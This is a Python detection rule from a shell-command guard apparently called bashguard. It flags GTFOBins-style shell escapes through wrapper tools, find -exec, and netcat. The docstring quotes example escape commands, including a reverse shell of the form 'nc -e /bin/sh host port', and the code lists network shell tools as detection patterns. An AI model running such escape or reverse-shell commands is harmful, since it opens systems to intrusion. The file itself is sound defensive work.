"""
bashguard.rules.shell_via_tool — Shell spawned as an argument to a non-shell tool.

GTFOBins documents many Unix tools that exec arbitrary commands by accepting
them as positional arguments or flags, bypassing the shell_in_shell detector
(which only looks at direct shell invocations like `bash -c ...`).

Three patterns:

1. Wrapper launchers: env/nice/nohup/watch/time/timeout/stdbuf/taskset/ionice/
   chrt/setarch accept a program as their first positional argument and exec it
   directly. `env /bin/sh` is indistinguishable to the OS from `/bin/sh`.

2. find -exec: `find . -exec /bin/sh \\;` passes a shell to exec via find's
   -exec/-execdir flags. Common GTFOBins technique.

3. nc/ncat -e: `nc -e /bin/sh host port` spawns a shell and connects its
   stdio to the network socket — classic reverse shell. The network.unknown_host
   rule catches the host; this catches the shell-exec flag independently.
"""
from __future__ import annotations

import logging

from bashguard.models import ActionType, ExecutionContext, Finding, Severity
from bashguard.parser import parse
from bashguard.rules import register

_log = logging.getLogger(__name__)

_SHELLS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "fish", "tcsh", "csh",
    "/bin/sh", "/bin/bash", "/bin/zsh", "/usr/bin/bash",
})

# Tools that exec their first positional arg directly (no interpretation)
_WRAPPER_LAUNCHERS = frozenset({
    "env", "nice", "nohup", "watch",
    "timeout", "stdbuf", "taskset", "ionice", "chrt",
    "setarch", "unshare", "nsenter",
    "time",          # bash builtin, but also /usr/bin/time
    "cpulimit",      # cpulimit --exec /bin/sh
    "multitime",
    "softlimit",     # daemontools
    "choom",         # Linux OOM score wrapper
    "setlock",       # djbdns
    "flock",
})


def _is_shell(name: str) -> bool:
    return name in _SHELLS or name.split("/")[-1] in _SHELLS


def _any_arg_is_shell(cmd) -> bool:
    """Return True if any positional argument is a shell binary."""
    return any(_is_shell(a) for a in cmd.args)


def _find_exec_has_shell(cmd) -> bool:
    """Return True if find's -exec/-execdir flag is present and any arg is a shell.

    Parser places -exec/-execdir in flags and the shell target in args.
    """
    _EXEC_FLAGS = {"-exec", "-execdir", "-ok", "-okdir"}
    if not any(f in _EXEC_FLAGS for f in cmd.flags):
        return False
    return _any_arg_is_shell(cmd)


def _nc_e_has_shell(cmd) -> bool:
    """Return True if nc/ncat uses -e/--exec with a shell.

    Parser places -e/--exec in flags and the shell path as the first positional arg.
    """
    _EXEC_FLAGS = {"-e", "--exec", "--sh-exec"}
    if not any(f in _EXEC_FLAGS for f in cmd.flags):
        return False
    return _any_arg_is_shell(cmd)


@register
class ShellViaToolRule:
    rule_id = "evasion.shell_via_tool"
    severity = Severity.CRITICAL
    description = "Tool used to launch a shell as an argument — GTFOBins wrapper escape"

    def check(self, script: str, context: ExecutionContext) -> list[Finding]:
        try:
            findings: list[Finding] = []
            for cmd in parse(script):
                if cmd.name in _WRAPPER_LAUNCHERS:
                    if _any_arg_is_shell(cmd):
                        findings.append(Finding(
                            rule_id=self.rule_id,
                            severity=self.severity,
                            message=f"'{cmd.name}' used to launch a shell — wrapper escape",
                            matched_text=cmd.raw,
                            action_type=ActionType.OBFUSCATED,
                        ))
                elif cmd.name == "find":
                    if _find_exec_has_shell(cmd):
                        findings.append(Finding(
                            rule_id=self.rule_id,
                            severity=self.severity,
                            message="find -exec used to spawn a shell",
                            matched_text=cmd.raw,
                            action_type=ActionType.OBFUSCATED,
                        ))
                elif cmd.name in ("nc", "ncat", "netcat", "busybox"):
                    if _nc_e_has_shell(cmd):
                        findings.append(Finding(
                            rule_id=self.rule_id,
                            severity=Severity.CRITICAL,
                            message=f"'{cmd.name} -e' spawns a reverse shell",
                            matched_text=cmd.raw,
                            action_type=ActionType.NETWORK_OUTBOUND,
                        ))
            return findings
        except Exception:
            _log.exception("ShellViaToolRule error")
            return []
